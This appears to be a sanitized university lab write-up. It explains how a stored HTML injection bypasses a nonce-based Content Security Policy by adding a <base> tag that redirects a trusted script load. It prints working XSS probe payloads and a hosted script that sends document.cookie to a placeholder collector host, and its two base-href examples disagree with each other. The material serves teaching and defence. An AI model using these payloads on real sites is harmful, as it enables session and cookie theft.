# Historical report: Engineering Base Uri

> Sanitized archival COMP6443 lab writeup. The larger assessment is team work; no exclusive individual authorship is inferred. Reported success is historical and has not been freshly reproduced. Addresses, accounts, identities, flags, encoded evidence, and screenshots are omitted or replaced. Code is illustrative and may contain draft errors. Read [review notes](../docs/report-review-notes.md).

# Engineering Challenge Writeup

## Overview

This challenge was a stored client-side injection problem protected by a nonce-based Content Security Policy. At first glance, the blog appeared to allow HTML rendering but not JavaScript execution. Simple payloads such as `<img onerror=...>` and `<svg onload=...>` were inserted into the page unchanged, but they did not execute because the CSP blocked inline script execution.

The intended solution was to exploit the fact that user-controlled HTML was rendered without sanitization and that the page included a nonce-authorized external script loaded from a root-relative URL:

```html
<script src="/analytics.js" nonce="..." ></script>
```

By injecting a `<base>` tag, it was possible to change where that trusted script was loaded from. This allowed attacker-controlled JavaScript to run under the page's valid nonce and exfiltrate the flag cookie when the administrator reviewed the reported post.

## Initial Reconnaissance

The first observation was that HTML tags in blog posts were rendered on the full post page. For example, formatting tags such as `<b>`, `<i>`, and `<u>` were interpreted by the browser instead of being escaped as text. This confirmed that the post body was inserted into the DOM as HTML.

Further testing showed that more dangerous markup was also preserved. Payloads such as the following appeared in the final page source:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

However, no alert box appeared. This indicated that the application was not sanitizing the HTML, but that script execution was being prevented by browser-side policy rather than server-side filtering.

## Content Security Policy Analysis

The relevant response header was:

```http
Content-Security-Policy: default-src 'none'; script-src 'nonce-...'; connect-src *; style-src https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css 'unsafe-inline'; img-src *;
```

This policy meant the following.

`default-src 'none'` blocked all resource types by default unless explicitly allowed.

`script-src 'nonce-...'` allowed only scripts carrying the correct nonce for that specific response. This prevented normal inline XSS techniques such as `<script>alert(1)</script>`, `onerror`, and `onload` from executing.

`connect-src *` allowed outbound connections to any origin.

`img-src *` allowed images to load from any origin, which was useful for exfiltration.

Most importantly, there was no `base-uri` directive. That omission made `<base>` injection possible.

## Why Reusing the Nonce Did Not Work

An initial idea was to observe the nonce from one request and then inject a script tag using that same value:

```html
<script nonce="observed_nonce">alert(1)</script>
```

This failed because the nonce changed on every response. The server-generated `<script src="/analytics.js" nonce="...">` tag always carried the current response's nonce, while any attacker-injected nonce was stale by the time the administrator later visited the page.

So the problem was not how to guess the next nonce, but how to reuse a script tag that the server itself would mark as trusted during the administrator's visit.

## Key Observation

At the bottom of the page, the application always injected:

```html
<script src="/analytics.js" nonce="CURRENT_NONCE"></script>
```

This was highly valuable because the script was already trusted by CSP. If the source of `/analytics.js` could be redirected to attacker-controlled content, that content would execute with the valid nonce automatically.

The post body appeared before this script tag in the final HTML. Since HTML in the post body was not sanitized, it was possible to inject:

```html
<base href="https://host.example.invalid/">
```

This changed the base URL used by the document. As a result, the page's trusted external script request was redirected to attacker-controlled content hosted on GitHub Pages.

## Attacker-Controlled Script Hosting

A GitHub Pages site was created to host a malicious `analytics.js` file at:

```text
https://host.example.invalid/analytics.js
```

The script used for validation and exfiltration was:

```javascript
document.title = "pwned";
new Image().src = "https://collector.example.invalid/REDACTED/?c="
  + encodeURIComponent(document.cookie)
  + "&u=" + encodeURIComponent(location.href);
```

The title change provided a quick visual check that the attacker-controlled script had executed. The image request exfiltrated both the cookie and the current URL to a webhook endpoint.

## Exploit Payload

The final blog post body only needed to contain:

```html
<base href="https://host.example.invalid/analytics.js">
```

When the page loaded, the browser resolved the application's trusted script through the attacker-controlled base, causing the browser to fetch and execute the malicious `analytics.js` file.

## Verification

Before reporting the post, the exploit was verified locally. Visiting the post caused a request to appear in the webhook log containing:

```text
flag="no flag for you"
```

This confirmed that:

1. the injected `<base>` tag was effective,
2. the trusted script load had been redirected,
3. the malicious `analytics.js` executed successfully, and
4. cookies could be read from JavaScript.

The value was only the fake flag because it came from a normal user session.

## Triggering the Administrator Visit

After the local test succeeded, the post was submitted through the built-in **Report Post** function. The administrator or bot then visited the page. On that visit, the same exploit chain executed again, but this time under the privileged session.

The webhook log then received a second request containing the real flag in the cookie value:

```text
flag=[REDACTED LAB FLAG]
```

## Root Cause

The vulnerability existed because several individually understandable design choices combined into an exploitable chain.

The application rendered attacker-controlled HTML directly into the page.

It relied on a nonce-based CSP instead of sanitizing that HTML.

It trusted an external script loaded from a predictable path.

It did not restrict the document base URL with `base-uri`.

It stored the flag in a cookie that was readable by JavaScript.

Together, these conditions allowed a stored injection to redirect a nonce-approved script load and execute attacker-controlled JavaScript without breaking the CSP directly.

## Final Payload Summary

Injected blog content:

```html
<base href="https://host.example.invalid/analytics.js">
```

Hosted `analytics.js`:

```javascript
document.title = "Hacked";
new Image().src = "https://collector.example.invalid/REDACTED/?c="
  + encodeURIComponent(document.cookie)
  + "&u=" + encodeURIComponent(location.href);
```

## Conclusion

This challenge demonstrates an important client-side security lesson: CSP is not a substitute for output sanitization. Even with a strict nonce-based script policy, allowing raw attacker-controlled HTML can still be dangerous when the document structure can be manipulated. In this case, the missing `base-uri` restriction made it possible to turn the application's own trusted script tag into an execution gadget and steal the administrator's flag cookie.
